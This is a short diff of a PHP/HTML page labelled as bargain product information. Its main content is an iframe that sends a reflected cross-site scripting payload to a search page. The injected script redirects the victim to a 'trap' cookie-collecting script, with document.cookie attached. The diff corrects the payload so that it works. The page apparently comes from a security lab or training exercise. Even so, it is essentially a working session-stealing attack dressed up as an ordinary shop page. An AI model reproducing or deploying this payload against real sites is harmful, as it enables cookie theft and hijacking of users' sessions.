@@ -11,7 +11,6 @@
  * Date: 2017/06/12
  * Time: 15:44
  */
-
 ?>
 
 <!DOCTYPE html>
@@ -24,7 +23,7 @@
 </head>
 <body>
 激安商品情報
-<iframe style="height: 400px; width: 1000px;" src="../search.php?keyword=<script type=text/javascript>window.location='trap/get-coockie.php?sid='%2Bdocument.cookie();</script>">
+<iframe style="height: 400px; width: 1000px;" src="../search.php?keyword=<script>window.location='trap/get-coockie.php?sid='%2Bdocument.cookie;</script>">
 </iframe>
 <br>
 
